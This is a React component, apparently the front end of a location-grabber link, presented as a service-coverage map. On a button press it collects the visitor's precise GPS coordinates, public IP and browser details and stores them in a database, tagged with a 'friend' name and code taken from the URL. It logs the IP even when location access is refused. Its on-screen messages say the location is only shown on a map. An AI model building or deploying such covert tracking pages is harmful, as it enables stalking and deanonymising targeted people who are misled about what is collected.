import { useState } from 'react';
import { getFriendFromURL, saveVisitorData } from '../utils/database';

const LocationTracker = ({ onLocationDetected }) => {
  const [status, setStatus] = useState({
    message: '👆 Apăsați butonul pentru a vă vedea locația pe hartă',
    type: 'info'
  });
  const [isLoading, setIsLoading] = useState(false);
  const [locationAllowed, setLocationAllowed] = useState(false);

  const { name: friendName, code: friendCode } = getFriendFromURL();

  const requestLocation = async () => {
    if (!navigator.geolocation) {
      setStatus({
        message: '❌ Browser-ul dvs. nu suportă harta interactivă.',
        type: 'error'
      });
      return;
    }

    setIsLoading(true);
    setStatus({
      message: '⏳ Detectăm locația dvs. pentru a o afișa pe hartă...',
      type: 'warning'
    });

    navigator.geolocation.getCurrentPosition(
      // Success
      async (position) => {
        const coords = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy
        };

        // Obține IP-ul
        let ip = 'unknown';
        try {
          const ipResponse = await fetch('https://api.ipify.org?format=json');
          const ipData = await ipResponse.json();
          ip = ipData.ip;
        } catch (error) {
          console.log('Eroare la obținerea IP-ului');
        }

        // Salvează datele
        const visitorData = {
          friend: friendName,
          friendCode: friendCode,
          timestamp: new Date().toLocaleString('ro-RO'),
          locationAllowed: true,
          coordinates: coords,
          userAgent: navigator.userAgent,
          ip: ip,
          page: window.location.href
        };

        await saveVisitorData(visitorData);

        setStatus({
          message: '✅ Vă mulțumim! Locația dvs. a fost afișată pe hartă.',
          type: 'success'
        });
        setIsLoading(false);
        setLocationAllowed(true);
        
        if (onLocationDetected) {
          onLocationDetected(coords);
        }
      },
      // Error
      async (error) => {
        let errorMessage = '';
        switch(error.code) {
          case error.PERMISSION_DENIED:
            errorMessage = '❌ Acces la locație refuzat. Nu putem afișa poziția dvs. pe hartă fără permisiune.';
            break;
          case error.POSITION_UNAVAILABLE:
            errorMessage = '❌ Locația nu este disponibilă. Verificați setările de locație.';
            break;
          case error.TIMEOUT:
            errorMessage = '❌ Timp expirat. Vă rugăm să încercați din nou.';
            break;
          default:
            errorMessage = '❌ Eroare la detectarea locației. Încercați din nou.';
            break;
        }

        // Salvează și refuzul
        let ip = 'unknown';
        try {
          const ipResponse = await fetch('https://api.ipify.org?format=json');
          const ipData = await ipResponse.json();
          ip = ipData.ip;
        } catch (ipError) {
          console.log('Eroare la obținerea IP-ului');
        }

        const visitorData = {
          friend: friendName,
          friendCode: friendCode,
          timestamp: new Date().toLocaleString('ro-RO'),
          locationAllowed: false,
          coordinates: null,
          userAgent: navigator.userAgent,
          ip: ip,
          page: window.location.href
        };

        await saveVisitorData(visitorData);

        setStatus({
          message: errorMessage,
          type: 'error'
        });
        setIsLoading(false);
      },
      // Options
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
      }
    );
  };

  return (
    <div style={{
      background: 'rgba(255,255,255,0.95)',
      padding: '20px',
      borderRadius: '10px',
      margin: '20px',
      boxShadow: '0 5px 15px rgba(0,0,0,0.2)',
      textAlign: 'center'
    }}>
      <h3 style={{ marginBottom: '15px', color: '#2d3748' }}>🗺️ Harta Acoperirii Noastre</h3>
      <p style={{ marginBottom: '20px', color: '#4a5568' }}>
        Vedeți zonele în care oferim servicii și verificați acoperirea în regiunea dvs.
      </p>
      
      <button
        onClick={requestLocation}
        disabled={isLoading || locationAllowed}
        style={{
          background: locationAllowed ? '#38a169' : 'linear-gradient(135deg, #2a5298 0%, #1e3c72 100%)',
          color: 'white',
          border: 'none',
          padding: '15px 30px',
          borderRadius: '25px',
          cursor: isLoading || locationAllowed ? 'not-allowed' : 'pointer',
          fontSize: '1.1rem',
          fontWeight: '600',
          margin: '10px 0',
          opacity: isLoading || locationAllowed ? 0.7 : 1,
          transition: 'all 0.3s'
        }}
      >
        {isLoading ? (
          <>
            <div className="loading"></div>
            Se detectează...
          </>
        ) : locationAllowed ? (
          '📍 LOCAȚIE AFIȘATĂ'
        ) : (
          '📍 DETECTEAZĂ-MĂ PE HARTĂ'
        )}
      </button>

      <div style={{
        marginTop: '15px',
        padding: '12px',
        borderRadius: '8px',
        fontWeight: '500'
      }} className={status.type}>
        {status.message}
      </div>
    </div>
  );
};

export default LocationTracker;